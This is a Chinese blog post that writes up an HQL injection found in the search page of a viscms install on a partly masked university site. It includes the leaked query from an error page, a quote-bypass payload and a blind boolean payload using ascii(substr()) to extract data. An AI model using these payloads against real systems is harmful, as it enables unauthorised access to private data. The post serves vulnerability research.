---
layout: post
title: 记一次viscms的SQL挖掘
date: 2017-09-27
tags: SQL
---

### 记一次viscms的SQL挖掘

嘛，其实也不是什么事儿，在找高校的漏洞的时候发现存在这么一个鸡肋的漏洞。链接是这样的。

	http://cms.***.edu.cn:8080/viscms/search.jspx?q=1&siteId=127060&submit=
	
这是一个查找搜索返回结果的界面。参数`q`是查询的内容，siteid是实用的网页模板。经过测试，q存在注入，而且会返回apache的错误界面。

![1](/images/posts/viscms/1.png)

其中爆出了SQL原句

	select count( bean.id ) from com.viscms.cms.entity.main.Content bean left join bean.contentTxtSet contentTxt  where 1=1 and (bean.contentExt.title like '%admin'--%' or contentTxt.txt like '%admin'--%' or bean.contentExt.keyword like '%admin'--%') and bean.site.id=127060
	
所以我们得知SQL是这样写的，也知道了这是一个HQL查询。不正确的使用ORM，依旧会存在注入。这里就是一个例子。

因为是HQL所以`--`在oracle中的注释效果没有了。导致了报错，报错又给了我们SQL语句，算是一个惊喜。

绕过方法是
	
	1' or 1 like '1
	会拼接为
	bean.contentExt.title like '%1' or 1 like '1%' or contentTxt.txt
	
所以我们可插入的执行语句在or之前。
因为or只会执行一句，而这里还有原句的SQL，所以我们改为and确保我们的语句能执行。最后验证漏洞的payload为

	1' and ascii(substr('sql',1,1))>3 and 1 like '1

`sql`中可以写要查询的对象的属性，就可以爆破出来。但是鸡肋的地方在于，似乎没办法在原句中插入一个新的对象，不然可以遍历数据库中所有的信息。而现在只能遍历原句中已有的数据。

转载请注明：[碎雪的小屋](http://RoyTse.github.io) » [记一次viscms的SQL挖掘](http://RoyTse.github.io/2017/09/记一次viscms的SQL挖掘/)  